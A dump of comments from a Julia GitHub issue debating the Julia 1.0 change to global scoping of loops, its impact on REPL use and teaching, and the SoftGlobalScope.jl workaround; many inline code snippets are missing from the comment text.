julia/JuliaLang/28789/414666648,28789,"So you would turn  into something like . And something like would be turned into this Frankly, I'm pretty annoyed that people are only giving this feedback now. This has change has been on master for ten months. ",,False
julia/JuliaLang/28789/414676770,28789,"I'm guilty of not having followed master very closed until recently, so this feedback is indeed a bit late. More than a concern for programmers (most  loops will be inside a function in library code) I'm afraid this is a concern for teaching. Often  loops are taught before functions or scopes (of course you need to understand scopes to really understand what's going on but in teaching things are often simplified). Here it becomes a bit difficult to teach a beginner how to sum numbers from 1 to 10 without explaining functions or global variables. ",,False
julia/JuliaLang/28789/414679559,28789,"To be fair, Julia 0.7 was released 13 days ago. This is a new change for most Julia users. ",,False
julia/JuliaLang/28789/414683856,28789,"Unfortunately for those of us who can not handle living on the edge, its brand-new from our perspective. ",,False
julia/JuliaLang/28789/414685810,28789,"And for those of us who have been encouraged to stay off the development branches, ""it's brand-new from our perspective."" ",,False
julia/JuliaLang/28789/414691501,28789,"Can we please go back to focus on the issue at hand now, instead of having a meta issue discussion about how long people have had to test this. It is what it is right now, so let's look forward. ",,False
julia/JuliaLang/28789/414693113,28789,"This is a big point. After finding out what the issue really is, it's surprising how little it actually shows up. It is less of an issue with a lot of Julia code in the wild and in tests, and it did reveal a lot of variables which were accidentally global (in both Julia Base's tests according to the original PR, and I noticed this on most of DiffEq's tests). In most cases it seems that the subtly wrong behavior isn't what you get (expecting a change in a loop), but rather expecting to be able to use a variable in a loop is what I've found to be the vast majority of where this shows up in updating test scripts to v1.0. So the good thing is that in most cases the user is presented with an error, and it's not difficult to fix. The bad thing is that it's a little verbose to have to put  inside of the loops, and now your REPL code is also different from the function code. Whether or not it's more intuitive behavior than before is a tough opinion because there were definitely some edge cases in hard/soft local scoping and so this is clearly easier to explain. But at the same time, while having a much more succinct explanation than the behavior of before, it's now easier to hit the edge cases where understanding scoping rules matters. 🤷‍♂️. I for one would like to see the experiments with  blocking. This would keep the ""you didn't really want so many globals"" aspect of it, along with the simplified scoping explanation, while at the same time make REPL code behave like function interiors (which is seemingly what we've always wanted). Or inversely, making people specify variables they want to act as globals could be a nice way to keep the explicitness, and would make the ""REPL code is slow because of globals"" be much more obvious. The downside is that once again throwing things into a function would not require the  markers. But given how this tends to show up, it's not really gamebreaking or a showstopper. I'd classify it as a wart  that should get a mention in any workshop but it's not like v1.0 is unusable because of it. I hope that changing this behavior isn't classified as breaking and require v2.0 though. ",,False
julia/JuliaLang/28789/414705246,28789,"I'm not so sure I like the idea that the REPL should behave like a function interior.  It clearly isn't, so I expect it to behave like global scope.  To me the REPL not behaving like global scope would be potentially even more confusing than the discrepency that causes this issue. Regardless, at the very least I think that the documentation should be somewhat more explicit about this issue.  Casually reading the docs I would have assumed that you would need to use the  keyword to get the behavior occurs in global scope by default. ",,False
julia/JuliaLang/28789/414708059,28789,"If we're going for ""REPL is the same as the inside of a function"" we should also think about  versus ",,False
julia/JuliaLang/28789/414736816,28789,"People haven't been using master for interactive use or for teaching, they've been using it to upgrade packages, which are only minimally affected by this and are mostly written by experienced programmers. (I was one of the few people who did give feedback in #19324, though, where I argued for the old behavior.) A non-breaking way out of this would be to change back to the old behavior (ideally not by inserting implicit  blocks or anything — just restore the old code in  as an option) in the REPL.  Or rather, to make it available in environments like IJulia that might want it, add a  flag to , , and  to restore the old behavior. ",,False
julia/JuliaLang/28789/414744522,28789,"Yes, and I greatly appreciate it. It doesn't much matter now since we made the choice, let it bake for ten months and have now released it with a long-term commitment to stability. So the only thing to do now is to focus on what to do going forward. Having an option to choose between the old behavior and the new one is interesting but it feels very hacky. That means we not only sometimes have a scoping behavior that everyone apparently found incredibly confusing, but we don't always have it and whether we have it or not depends on a global flag. That feels pretty unsatisfactory, I'm afraid. ",,False
julia/JuliaLang/28789/414745619,28789,"If someone implements an ""unbreak me"" soft-scope AST transformation, it will be very tempting to use it in IJulia, OhMyREPL, etcetera, at which point you get the even more problematic situation in which the default REPL is seen as broken. ",,False
julia/JuliaLang/28789/414747822,28789,"That's not what I'm saying. Clearly we should use the same solution in all those contexts. But implementing it as two different variations on scoping rules seems less clean than implementing it as a code transformation with one set of scoping rules. But perhaps those are functionally equivalent. However, it seems easier to explain in terms of the new simpler scoping rules + a transformation that takes REPL-style input and transforms it before evaluating it. ",,False
julia/JuliaLang/28789/414749202,28789,"That could be done as  that transforms an expression by automatically annotating any globals which exist in the module as global if they are assigned inside of any top-level non-function scope. Of course, I think that's equivalent to what the old parser did, but a bit more transparent since you can call  yourself and see what the REPL will evaluate. ",,False
julia/JuliaLang/28789/414749541,28789,"I actually started looking into implementing this a few minutes ago.  However, it looks like it would be much easier to implement as an option in   Writing an external AST transformation is possible, but it seems like there are lots of tricky corner cases … whereas we already had the code to get it right in . It's even more tricky for something like IJulia that currently uses  to evaluate a whole block of code and get the value of the last expression.  Not only would we have to switch to parsing expression by expression, but some hackery may be needed in order to preserve the original line numbers (for error messages etcetera). Not to mention of the case of people that  external files, which would not be caught by your AST transformation.  I seriously doubt this would be easier to explain to new users than just saying that the rules are less picky for interactive use. ",,False
julia/JuliaLang/28789/414764508,28789,Here is a rough draft of a  implementation ,,False
julia/JuliaLang/28789/414799023,28789,"Okay, I've figured out how to implement a  function that preserves line-number information, and have added it to my gist. A possible (non-breaking) way forward, if people like this approach  Release a SoftGlobalScope.jl package with the  etc. functions. Use SoftGlobalScope in IJulia (and possibly Juno, vscode, and OhMyREPL). Fold the SoftGlobalScope functions into a future release of the REPL stdlib package and use it in the REPL.  Or is it practical to roll it into REPL.jl immediately?  I'm not completely clear on how stdlib updates work in 1.0. Please take a look at my implementation, in case I'm missing something that will cause it to be fragile. ",,False
julia/JuliaLang/28789/414827097,28789,Can't we have it as a non-default feature of the REPL in 1.1? ,,False
julia/JuliaLang/28789/414833357,28789,"Duplicate of #28523 and #28750. To those saying they don't want to teach people about global variables, I suggest teaching functions first, before  loops. Functions are more fundamental anyway, and this will help set the expectation that code should be written in functions. While I understand the inconvenience, this scoping behavior can be turned into a pedagogical advantage ""In fact, global variables are such a bad idea, particularly using them in loops, that the language makes you bend over backwards to use them."" Adding a non-default feature to the REPL for this seems ok to me though. ",,False
julia/JuliaLang/28789/414851094,28789,"@friend, remember that many of us would like to use Julia as a substitute for Matlab etcetera in technical courses like linear algebra and statistics.  These are not programming courses and the students often have no programming background.   We never do structured programming — it's almost all interactive with short snippets and global variables. Furthermore, the reason I'm using a dynamic language in the first place is to switch fluidly between interactive exploration and more disciplined programming.   The inability to use the same code in a global and a function context is a hindrance to that end, even for someone who is used to scoping concepts, and it is much worse for students from non-CS backgrounds. ",,False
julia/JuliaLang/28789/414855621,28789,"Many of us Julia users have absolutely 0 CS background (including myself), but it seems to me that the proper attitude (especially for students) is a willingness to learn rather than demanding things be changed for the worse to accommodate our naivete. Now, I'm not necessarily implying that this particular change would be for the worse as I only have a limited understanding of what's going on here, but if it is the case that this is a significant complication or makes it excessively easy to write needlessly badly performing code it does not seem worth it to make a change in order to have a better lecture example.  You can't change the laws of physics so that the electrostatics examples you show to freshman are more applicable to real life. So my question as a non-CS user who also cares about performance is how would I be likely to screw up if this were made the default behavior.  Is it literally just the sorts of examples we are seeing here that are a problem (which I was already aware of), or are we likely to often screw this up badly in more subtle ways? For what it's worth, I do agree that having code behave differently depending on its enclosing scope is a generally undesirable feature. ",,False
julia/JuliaLang/28789/414870502,28789,"Making code harder to write interactively, forcing beginners writing their first loops to understand obscure scoping rules, and making code pasted from functions not work in global scopes does not help programmers write fast code in functions. It just makes it harder to use Julia interactively and harder for beginners. ",,False
julia/JuliaLang/28789/414872850,28789,"Making an ""unbreak me"" option the default seems wiser, especially an option that is aimed squarely at beginning users.   If it is a non-default option, then precisely those people who need it most will be those who don't have it enabled (and don't know it exists). ",,False
julia/JuliaLang/28789/414930024,28789,"What would the proposed REPL-mode do to ed scripts?  Would the evaluation of global statements depend on whether the REPL mode is activated?  If so, IMO this would be at odds with the 1.0 stability promise. ",,False
julia/JuliaLang/28789/414937052,28789,"If we did something like this it seems like it might make sense for the module to determine how it works. So  would be a ""soft scope"" module while by default other modules would be ""hard scope"" modules. ",,False
julia/JuliaLang/28789/415063358,28789,"I was interested to see if it was possible to monkey patch the REPL to use @friend's  function and it appears it is without too much effort (though quite hacky). See the gist. This doesn't work with Juno (or anything else that calls  directly). I'm not going to be recommending this to people, but it's quite useful to me when doing quick-and-dirty data analysis. I would very much like to see a (better thought out) solution since it really is quite confusing for inexperienced and often reluctant coders (i.e., my students) when you can't copy and paste in code from a function into the REPL to see what it does and vice-versa. (BTW the above is about as much testing as it has had!) ",,False
julia/JuliaLang/28789/415065926,28789,"Nothing.   Basically, the proposal is that this would only be for code entered at an interactive prompt.   As soon as you start putting things in files, you need to learn the ""hard scope"" rules.   Hopefully, when you start putting code into files you should start using functions. It's not ideal for there to be pickier scoping rules for global code in files than at the prompt.   But I think that #19324 combined with the Julia 1.0 stability promise leaves us with no ideal options. ",,False
julia/JuliaLang/28789/415069914,28789,"@friend Having taught courses using Julia to students with prior exposure to Matlab/R/..., I sympathize with this concern. But at the same time, I don't think that using Julia just as a Matlab etc substitute is a viable approach as demonstrated countless times by questions on Discourse and StackOverflow, this can lead to performance pitfalls that are difficult to fix and understand, possibly entailing an even larger cost than investing in understanding how Julia is different from these other languages (cf posts with topics ""I translated this code from Matlab and it is 10x slower""). I think that the key issue is the silent failure; the issue per se is easy to understand and fix. I would suggest keeping the new behavior, but giving a warning in  (by default; it should be possible to disable it). ",,False
julia/JuliaLang/28789/415080902,28789,"Sorry, but this argument is ridiculous to me.   I'm not talking about classes where I'm teaching programming.  There's a place for simple interactive computations, and in non-CS classes it's common to be introduced to programming languages as a ""glorified calculator"" to start with.  Teaching performance computing in Julia is an entirely different process — but it doesn't hurt if they've already been using Julia as their ""calculator."" If you start by introducing students to Matlab as their ""calculator,"" it's much harder to make the transition to ""real"" programming, because their first instinct is to do as much as possible with Matlab before jumping ship, at which point their bad habits are ingrained and they are reluctant to learn a new language.  In contrast, if you start with Julia as your glorified calculator, when it comes time to do more serious programming you have a much wider array of options available.  You don't have to train them to cram everything into ""vector"" operations or force them to do things badly before they do it right. Are you saying I shouldn't use Julia in my linear-algebra course?   Or that I should only use it if I'm prepared to teach computer science as well as linear algebra? ",,False
julia/JuliaLang/28789/415086587,28789,"I agree with @friend both on the problem (teaching to non programmers becomes much harder) and on the solution (make things work in the REPL and the various IDEs). Including a script would still have the Julia 1.0 scoping rules but that's less of a concern, one just has to be careful to have the ""we can put our for loop in a function and then call the function"" class before the ""we can put our for loop in a file and include the file"" class. This sounds like a good compromise as interactive debugging at the REPL doesn't become more painful than it needs to be (or more confusing to new users), while normal code in scripts has to follow strict scoping rules and is safe from bugs overwriting some variables accidentally. ",,False
julia/JuliaLang/28789/415087488,28789,"You may have misunderstood what I was saying (or I did not express it clearly). I was talking about courses that use Julia to teach something domain-specific (eg I taught numerical methods to econ grad students), not CS courses (which I have no experience with). The point that I was trying to make is that it is reasonable to expect a certain level of difference between Julia and language X (which may be Matlab); conversely, ignoring this can (and does) lead to problems. Personally, when learning a new language, I prefer to face these issues early on; also, I think simplicity and consistency of the language semantics is more important than similarity to other languages in the long run. But I recognize these preferences as subjective, and reasonable people can have different ones. ",,False
julia/JuliaLang/28789/415101455,28789,"I've created the (unregistered) package  this seems reasonable, I can go ahead and register the package and then use it by default in IJulia (and perhaps submit PRs to Juno etcetera). ",,False
julia/JuliaLang/28789/415102619,28789,"Obviously.  When I say ""use Julia instead of Matlab"", I don't mean I'm trying to teach them Matlab syntax in Julia. It's not about differences from Matlab per se.  I would really rather not talk about global vs local scope and the utility of a  keyword for static analysis the first time I write a loop in front of non-CS students, or the first time they paste code from a function into the REPL to try it interactively.   I would rather focus on the math I'm trying to use the loop to express. No one here is arguing for soft interactive scope just because that's what Matlab users expect.  We are arguing for it because that is what all first-time users will expect.   (And because even for experienced users, it's rather inconvenient to be forced to add  keywords when we are working interactively.) ",,False
julia/JuliaLang/28789/415104827,28789,One other fix not mentioned here is to simply stop making ‘for’ define a scope-block (just function and let would create new scope) ,,False
julia/JuliaLang/28789/415105087,28789,"@friend, I'd rather focus this discussion on things that we can do before Julia 2.0.   I agree that having interactive mode behave differently is only a stopgap, though, and we should seriously contemplate changing the scoping rules in a few years. ",,False
julia/JuliaLang/28789/415107802,28789,"Good point, this also needs  😀 (I think this module/namespace/behavioral effect already is reserved/exists) As a reminder here, the change was to ensure that code behaves the same in all global scope environments, regardless of what else had previously been evaluated in that module. Before this change, you could get completely different answers (resulting from different scope assignment) simply by running the same code twice or by moving it around in a file. ",,False
julia/JuliaLang/28789/415108211,28789,The number of complaints I saw about that in practice (zero) are certain to be dwarfed by the number of complaints and confusion you will see (and are already seeing) about the current behavior. ,,False
julia/JuliaLang/28789/415109136,28789,"Do you mean that in the below code,  changes between the first and second  loops? In my mind, that's expected behavior, not a bug. ",,False
julia/JuliaLang/28789/415218559,28789,"@friend @friend I suppose adding a function (say, ) can be done with just a minor version bump?  We can also warn 'ing another file from 'ed script and then put some pedagogical messages there to nudge them to use . ",,False
julia/JuliaLang/28789/415280847,28789,"Some thoughts I wrote down last night while trying to wrap my head around this issue (yet again) to try to figure out what the best course of action might be. No conclusion, but I think this lays out the problem quite clearly. After having thought about this issue for some years, I don't think there is any ""ideal solution""—this may be one of those problems where there are only suboptimal choices.  People naively view global scope as a funny kind enclosing local scope. This is why global scopes worked the way they did in Julia 0.6 and prior  If an outer local scope creates a local variable and an inner local scope assigns to it, then that assignment updates the outer local variable. If an outer global scope creates a global variable and an inner local scope assigns to it, then that assignment previously updated the outer global variable.  The main difference, however, is  Whether an outer local variable exists, by design, does not depend on the order of appearance or execution of the expressions in the outer local scope. Whether a global variable exists, however, cannot be independent of order, since one evaluates expressions in global scope, one at a time.  Moreover, since global scopes are often quite lengthy—not infrequently spread across multiple files—having the meaning of an expression depend upon other expressions an arbitrary distance from it, is a “spooky action at a distance” effect, and as such, quite undesirable.  This last observation shows why having the two different versions of a for loop at global scope behave differently is problematic Also note that the contents of  and  are identical and we could simplify the example by including the same file twice with a different meaning and behavior each time. ",,False
julia/JuliaLang/28789/415282794,28789,Another problematic case is a long-running REPL session. Try an example from somewhere online? It fails because you happened to have a global variable by the same name that the example uses for a local variable in a for loop or similar construct. So the notion that the behavior is the only one that can cause confusion and problems is definitely not accurate. I agree that the new behavior is a usability issue in the REPL but I just want to temper the conversation and present the other side clearly here. ,,False
julia/JuliaLang/28789/415496822,28789,"My small suggestion, that does not deal with the repl problem, but would be useful for didactic purposes when teaching the language not-interactively, at least define a main block named ""program"", like can be done in fortran (it is the same as the ""let...end"" above, just with a more natural notation) program test ... end one could teach the language without going into the scope details and only eventually discuss that point. ",,False
julia/JuliaLang/28789/415500327,28789,"How many mailing-list complaints and github issues have been filed about this?  Zero, by my count.   Why?  Probably because this behavior is fundamentally unsurprising to people — if you work in global scope, you depend on global state. I think this is a false equivalence — there is a vast disparity in the level of potential confusion here.  In Julia 0.6, I could explain your example to a student in seconds ""Oh, see this loop depends on , which you changed here.""   In Julia 1.0, I'm honestly worried about what I will do if I'm in the middle of a linear-algebra lecture and have to mysteriously type a  keyword in front of students who have never heard the word ""scope"" in the CS sense. ",,False
julia/JuliaLang/28789/415531290,28789,"Absolutely not. Do you seriously want to go back to the pre-v0.2 world (see #1571 and #330) of loop scope? We have actually never fully supported copying and pasting code from a function line-by-line into the REPL. So we can view this as an opportunity to make that work. Specifically, while it ""worked"" for  loops, it did not work for inner functions Inside a function,  will mutate the  from the first line. In the REPL it won't. But with a transformation like that in SoftGlobalScope.jl it could work. Of course, we probably wouldn't want that on by default since then pasting stand-alone function definitions wouldn't work. The first thing that comes to mind is a REPL mode for line-by-line function debugging. ",,False
julia/JuliaLang/28789/415541690,28789,"No, I want to go back to the 0.6 world. 😉 ",,False
julia/JuliaLang/28789/415552955,28789,I guess I was responding more to ,,False
julia/JuliaLang/28789/415606620,28789,"I very much appreciate this sentiment and for my use cases it would really help. From my perspective it is really about making the REPL as useful as possible rather than changing the scoping rules of the language directly. That said, the more I think about this problem the more I see the conflicting views I (personally) hold as to what the REPL should do. To be concrete, I'd very much like it if the REPL matched the scoping rules of a function body; i.e., variables are local rather than global and you can just copy-and-paste code directly from a function and know that it will work. I imagine a naive implementation would be something like let-block wrapping (as has been mention previously) of the form being transformed into Done properly (i.e., by someone who knows what they are doing), I imagine that this would have a number of benefits over the existing REPL. 1. previous workflows with interactive data analysis/computation just work. 2. far fewer posts on Discourse where the basic response is ""stop benchmarking with global variables"" - everything would be local and so hopefully fast! ) 3. copy-and-paste to/from a function body works as expected. 4. a  like function is trivial if the backing store is some sort of Dict; just clear it out. 5. globals become explicit - things are local unless you specifically ask for them to be global; this is a big advantage from my perspective, I don't like implicitly creating globals. A very minor final point (and I hestiate to add this!), this would match the behaviour of Matlab making it easier for people transitioning - at the Matlab REPL all variables seem to be local unless explicitly annotated as global. Until a few hours ago this story sounded great to me. But after Jeff's comment about functions I thought about pasting in stand-alone function definitions and how this approach would basically prevent that since function definitions should go in the global scope (at least, that is probably what is intended); but then what if they were intended to go into the local scope (an inner function)? There is no information to disambiguate the two possibilities. It would seem that two REPL modes are needed, one with local scope and one global scope. On one hand that could be very confusing (imagine the Discourse posts...) but on the other it could be extremely useful. (Having both REPL modes would also be non-breaking since you are just introducing new functionality ) ) Going for the halfway house of  might end up being the least confusing compromise but my worry is that it's just another set of rules to remember (which things work in the REPL but not in my function body/global scope and vice-versa). Apologies for the long post but I think this is important for usability (and it helped me think it through!). ",,False
julia/JuliaLang/28789/415657705,28789,"Hmm, did you really make a systematic study of this? I must have missed that. Nevertheless, this does not mean that this behavior is not a source of bugs or unexpected results; just that after the user has figured it out, it was recognized as correct behavior and thus did not prompt an issue/complaint. I sympathize with this problem. When I taught into some simple programming to econ students necessary for a course, I usually suggested that they go back and forth between wrapping code in functions, and simply commenting out  and  and running things in the global scope, so they could inspect what is happening. This pretty much made up for the lack of debugging infrastructure at that time in Julia. It appears this approach is no longer feasible. But I wonder if it was really the right way to do it anyway, and in the meantime various things have improved a lot (#265 was fixed, Revise.jl and recently Rebugger.j have improved workflow/debugging considerably). It seems that this issue does not bother experienced users very much, the main concern is confusion in a pedagogical setting. I have not experimented with this myself yet, but I wonder if we could adapt our approaches to teaching instead, eg introduce functions before loops, avoid loops in global scope. These are elements of good style anyway and would benefit students. ",,False
julia/JuliaLang/28789/415672805,28789,"Just a wee note whilst special casing the global scope of the REPL, will allow copy-pasting code into and from functions, it will not allow copy-pasting into/from the global scope of another module. ",,False
julia/JuliaLang/28789/415806279,28789,This is totally impractical in a class that is not focused on teaching programming.   I might as well not use Julia in my classes if I can't use it interactively and/or have to write functions for everything first. (And it's not just pedagogical.  Loops in global scope are useful for interactive work.  And one of the main reasons people like dynamic languages for technical computing is the facility for interactive exploration.) ,,False
julia/JuliaLang/28789/416000347,28789,"There have been dozens of threads and issues over the years in which people are confused or complaining about the old ""soft/hard scope"" distinction, so claiming that no one has ever been confused by or complained about the old behavior is just... not true. I could dig some of them up, but you were around, @friend, so you can dig them up just as easily and I have a hard time believing that you didn't notice or don't remember these complaints and conversations. ",,False
julia/JuliaLang/28789/416031817,28789,"@friend, I'm specifically referring to people complaining that a global loop depends on global state.  I don't recall anyone complaining that this was bad behavior. I agree that people have been confused about when and where assignment defines new variables, but it has usually been in the other direction — they wanted local scopes to act more global (rather than vice versa), or to not have a distinction between  and .   IIRC, the complaint was never that assigning to a global variable in a global loop had the surprising side effect of modifying a global. I agree that the whole issue of scoping is confusing to new users, and it will continue to be so.  But the confusing part was not cases where assigning to a global variable name affected the global state. ",,False
julia/JuliaLang/28789/416163963,28789,"@friend I have the feeling that previously, the confusion with soft/hard scope was more of a theoretical nature (of people reading the manual) rather than of a practical on (of people getting unexpected results).  That was definitely how it was for me and what, e.g., the search results here support this; I found one counter-example here. On the other hand, this new behavior will not confuse people when reading the manual, but when using the REPL.  Arguably the latter is worse. ",,False
julia/JuliaLang/28789/416217595,28789,"SoftGlobalScope.jl is now a registered package.  My intention is to enable it by default (opt-out) for IJulia, at least this semester. ",,False
julia/JuliaLang/28789/416218130,28789,"@friend, even your ""counter-example"" is about someone confused by hard scope, not by soft scope.  Making more scopes ""hard"" in 0.7 is certain to create more of this sort of confusion. ",,False
julia/JuliaLang/28789/416306838,28789,"I would point out that IJulia has the interesting possibility of making variables local do blocks by default. I.e. if you do this in a single block then it works ... and  is only visible within this evaluation block. If you wanted it to be visible outside, you would have to do this I have also considered a similar approach for Julia where the blocks are files rather than module. In other words just doing  at top scope creates a variable that is file-local rather than global. To declare a truly global variable, you'd need to write  which would then be visible throughout the module. Perhaps too weird, but it has occurred to me many times over the years. ",,False
julia/JuliaLang/28789/416324660,28789,"@friend, I think this would be even more confusing, and would run counter to how notebooks are normally used.  It is common for the same variable to be used/modified in multiple cells, so requiring a  keyword for all inter-cell variables is a nonstarter to me — it would require even more discussion of scope concepts than the issue with  loops we've been discussing here. ",,False
julia/JuliaLang/28789/416339290,28789,"I think as long as we all agree --- as we seem to --- that this is mostly or entirely an issue for interaction, then we have a way forward. If we special-case this in the REPL (as is being done for IJulia), the only bad case is developing something in the REPL and then moving it to top-level script code. Arguably that's the point where you should introduce functions, so I don't think it's so bad. Copy-pasting code between the REPL and function bodies will work (mostly), which is probably good enough. Then we also have the option of further justifying/clarifying the distinction by making REPL variables somehow local to the REPL --- i.e. not normal global variables, not available as . This is very similar to what @friend just proposed above, but shared among all input blocks/cells. ",,False
julia/JuliaLang/28789/416579834,28789,"From a practical point of view, getting this ""fixed"" in the REPL is not only important for teaching/non-programmer users. This behaviour also makes interactive debugging via the REPL (by copy-pasting parts) very unpractical. This mode of debugging can sometimes be preferable (even to a good debugger and) even for experienced programmers (and is often one of the reasons to prefer a dynamic language). Of course for the experienced programmers, being optional shouldn't be a problem; For novice users it would be preferably the default. @friend  As a naive programmer, I don't really see what is so wrong in viewing the global scope as a funny kind enclosing local scope, especially in dynamic languages. I do understand that from a compiler point of view it is not necessarily correct (in Julia), but it is a nice, easy and useful model for a (naive) programmer. (I also suspect it might be actually implemented that way in some languages). Julia also seems to presents it that way to the programmer The following function function will give the error ""a not defined"", which it will not do if a=1 is put before the for loop. function test()     for i = 110         a=a+i     end     a=1     @friend a end which, unless I complete misunderstood, seems at odds with ""Whether an outer local variable exists, by design, does not depend on the order of appearance or execution of the expressions in the outer local scope"". I very much agree with avoiding ""spooky action at a distance"", and much prefer explicit definition for using globals at the function/call stack level and would personally also like having something like loading from a file in its own scope, and requiring explicit definition for using global variables. At the level of loops is going a bit to far for me though, as the definitions/context is usually quite near. The 3 files example is a bit contrived (and fails with the expected ""a not defined"" error) You would normally put the initial definition in the same file.  There is actual spooky danger in this (and I have been bitten by it in other languages) in that includes are run in the global scope, so you are inadvertently defining a global variable that may interfere with other code. However, having to use global in the loop is not a solution to this problem. wrt to the long-running REPL session The current behaviour replaces a very rare and easy to spot failure mode for running an online example in the REPL (you miss copy/pasting the initial definition of the variable before the loop, and already have the same variable defined globally from something previous) with not being able to run an online example correctly if it is part of a function (without adding global everywhere), and not solving the problem if it is not (if global is already there in the online code, you will still use the wrong value in the already existing global variable) ",,False
julia/JuliaLang/28789/416589794,28789,"I should have tuned into this earlier, but after a brief moment of concern all seems to be well. Indeed Rebugger (which is exactly that) works properly on 1.0 only because it lacks the scope deprecation of 0.7, and could never be made to work on 0.6. However, I'm pleased to be able to verify that SoftGlobalScope.jl seems not to break that. For example, if you step deeply enough into  you get here So it works fine on 1.0 (with or without ). On 0.7, evaluating this (with or without ) will yield So 0.7/1.0 are definitely a step forward, and if  makes certain things easier without breaking important functionality that's great. The biggest concern, therefore, is simply how to intercept this appropriately without tanking other packages (",,False
julia/JuliaLang/28789/416597335,28789,"@friend, SoftScope does not touch the arguments of macro calls (since there is no way to know how the macro would rewrite it), so  is protected. ",,False
julia/JuliaLang/28789/417026433,28789,"outer local variable exists, by design, does not depend on the order of appearance or execution of the expressions in the outer local scope"". The (outer) local variable  exists, but has not been assigned yet. If the loop tried to assign to  before reading it, the assignment would be visible outside as well. In general, creating a variable binding and assigning a value to it are separate steps. ",,False
julia/JuliaLang/28789/417414205,28789,"What is the time-line on this?  It seems it would be a great improvement to user usability.  And at this ""critical"" time of Julia with 1.0 out, it would seem advantageous to get this fixed asap (as suggested by Jeff above) and tag a new version Julia or REPL version.  (Sorry for this arm-chair comment, as I certainly will not fix this!) ",,False
julia/JuliaLang/28789/417852389,28789,"@friend  I was going to argue that while this is true (for the implementation/compiler), the naive julia programmer cannot not see any different behaviour from his simpler conceptual model (a variable starts existing at the moment it is defined). Unfortunately you are right, the following code will not give an error, while it will give an error if you leave out the a=2 at the end function test()     for i = 110         a=1     end     println(a)     a=2 end I'll explain the unfortunately I can understand the behaviour (because i've worked with compiled languages before) but still find it confusing and unexpected. How bad must it be to someone with only scripting experience or new to programming. Also, I found some code that shows the behaviour, I do not see a useful application (maybe you can help me there) On the REPL I just got more convinced that changing the scoping back to ""normal"" at  least in the REPL (no need to add global in loops) is high priority I was testing some things in the REPL today and got (again) bitten by it, taking some time to realize it. Given that I follow Julia already some time, really like a lot of it, am even following this thread about the problem, I would even call it a showstopper A newbee (to the Julia) testing out the language is very likely not to find out the problem and just give up. ",,False
julia/JuliaLang/28789/418209187,28789,"@friend and I are both on long-awaited vacations (I should not be reading this). We can figure out what to do in a week or so. @friend, while the feedback is appreciated, scoping rules are not up for a broader debate or revision. The only thing on the table is special-casing interactive eval. The SoftGlobalScope package is already an excellent experimental implementation and it may just be a matter of making that part of Base and using it in the REPL. ",,False
julia/JuliaLang/28789/418900808,28789,"@friend A short answer is that I think it's easier if the scope of a variable corresponds to some block construct (e.g. the body of a function or loop). With your suggestion, the scope of a variable would be some subset of a block, which I think is ultimately more complex and confusing --- you can't point to a syntactic form that corresponds to the scope of the variable. Yes, I can believe this is a mismatch for some people's intuition. But you can only optimize for the first ten minutes of using a language up to a point. The real question is, how hard is it to teach/learn how it works, and which design will save time in the long run (by making the language simpler, making it easier to develop tooling, etc.)? ",,False
julia/JuliaLang/28789/418942157,28789,(in agreement with much of the above about modifying the behavior of the REPL) I'd like to see the REPL be in a way that does not lead to this stackoverflow question  and sooner would be best as many new eyes are looking at Julia ,,False
julia/JuliaLang/28789/418945069,28789,"I agree... And also think that the scoping rules shouldn't necessarily change, just all of the interactive interfaces (i.e. the REPL, Jupyter, and Juno control enter) This is not just about beginners learning a new rule. If you can't copy and paste fragments of code into the REPL, jupyter etc and also into functions, it is a major annoyance for intermediate programmers as well. Of course, I also agree with the other posters... with beginners they going to take code fragments they see within functions, copy I into scripts, and be completely confused when it doesn't have the same behaviour when copied inside of a function, in juno, the repl, and jupyter. There will be 100 stack exchange questions which come down to the same issue. Intermediate programmers are going to have all sorts of homegrown solutions with wrapping in  blocks, etc which will confuse things further ",,False
julia/JuliaLang/28789/418966000,28789,"Possibly, but at this stage this is hypothetical (also the OP of the question linked is asking about the rationale for the scoping rule, as opposed to being confused about it). Also, while I respect the teaching experience of everyone who has concerns about this, whether this turns out to be a big deal in the classroom is something that time will tell. ",,False
julia/JuliaLang/28789/418967383,28789,"the questioner appears to have been confused by it ""I wonder if this is intuitive to beginning julia users. It was not intuitive to me ..."" ",,False
julia/JuliaLang/28789/418968414,28789,"Not to mention that this is someone who clearly knows enough about programming languages to understand the nuances of scope. What about all of the matlab type users that are completely ignorant of these topics..., and probably will never invest enough time to understand the nuances. ",,False
julia/JuliaLang/28789/418970409,28789,"I've already answered multiple questions related to this on stackoverflow, mostly by new users, and even more in real life (last one just yesterday, from a Matlab user, who saw this as a no go). ",,False
julia/JuliaLang/28789/418976170,28789,"In my ""spare time"", I've been adding  and  tags to the SE questions.  I only stop because of lack of time, not because there aren't more. ",,False
julia/JuliaLang/28789/421457801,28789,"Conclusion after much discussion including triage we're going to include something along the lines of  in Base and use it in the REPL and all other interactive evaluation contexts. @friend has pointed out that the way this is implemented is actually essentially the same as how soft scope was previously implemented, so to some extent we're coming around full circle. The difference is that now there is no scope behavior in modules or scripts, only in REPL-like contexts. I also think that explaining soft scope as a source rewrite is clearer than trying to distinguish between hard and soft scopes (which we never how Jeff explained it, I might point out). ",,False
julia/JuliaLang/28789/421532052,28789,These two statements confuse me a bit as they seem a bit contradictory Does this mean that the module  has sometimes a soft scope (say at the REPL prompt) and sometimes a hard scope (say when )?  Would it not make sense to say that  always has soft scope? And a module can opt-in to soft scope by ? ,,False
julia/JuliaLang/28789/421623132,28789,"(I guess) scoping rules cannot be changed in scripts because it would be backwards incompatible, i.e. would break the promise that any code written for 1.0 will run on any 1.* version. You are correct though that the same problem with scoping for the REPL also applies to scripts (naive user at a complete loss why his/her code does not work properly when run as a script). A way to solve/alleviate this problem without major incompatibilty would be to add an option to the julia cmdline to use  softscope (or alternative) , e.g. julia -f programfile, and show this option in any description/tutorial that a beginner is likely to come across. I also see a potential alternative for the softscope that may have some advantages (though i am probably overlooking disadvantages) What if a file (a called script) would always introduce its own local scope scoping rules would be in complete consistency with those in functions, and with the expectations of a lot of users. It would also remove a lot of the performance liabilities with new users  No more unneeded globals (globals would have to be explicitly defined), and code might be compiled (How many times have you had to say to put everything in a function, and to avoid using globals?) ",,False
